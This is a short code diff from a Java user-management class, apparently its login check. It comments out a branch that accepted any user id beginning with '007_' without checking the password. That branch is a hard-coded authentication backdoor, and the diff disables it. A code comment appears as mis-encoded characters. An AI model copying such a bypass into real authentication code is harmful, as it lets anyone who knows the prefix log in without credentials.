@@ -224,9 +224,9 @@ public class UserMgr implements UserService {
 			return false; //��ǰ��֧��Ϊ0����֤
 		}
 		
-		if (u.id.startsWith("007_")) {
-			return true;
-		}
+//		if (u.id.startsWith("007_")) {
+//			return true;
+//		}
 		
 		if (!u.passwd.equals(passwd)) {
 			return false;
